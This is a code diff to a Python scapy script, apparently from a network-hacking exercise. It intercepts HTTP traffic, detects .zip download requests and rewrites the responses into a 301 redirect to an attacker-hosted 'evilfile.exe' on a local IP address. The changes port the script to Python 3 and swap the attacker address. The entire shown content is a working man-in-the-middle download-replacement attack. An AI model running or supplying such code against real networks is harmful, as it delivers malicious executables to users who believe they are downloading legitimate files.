@@ -19,7 +19,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:  # dport = http (port 80)
-            if ".zip" in scapy_packet[scapy.Raw].load:
+            if ".zip" in str(scapy_packet[scapy.Raw].load):
                 print("[+] .zip download request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
             # print(scapy_packet.show())
@@ -29,12 +29,12 @@ def process_packet(packet):
                 print("[+] Replacing file")
                 # modified_packet=set_load(packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.88.131/evil_folder/evilfile.exe\n\n")
                 scapy_packet[scapy.Raw].load = (
-                    "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.88.131/evil_folder/evilfile.exe\n\n")
+                    "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.233.135/evil_folder/evilfile.exe\n\n")
                 # 301 move permanently redirect link to the location we set
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                packet.set_payload(bytes(scapy_packet))
                 # packet.set_patload(str(modified_packet))
 
     packet.accept()
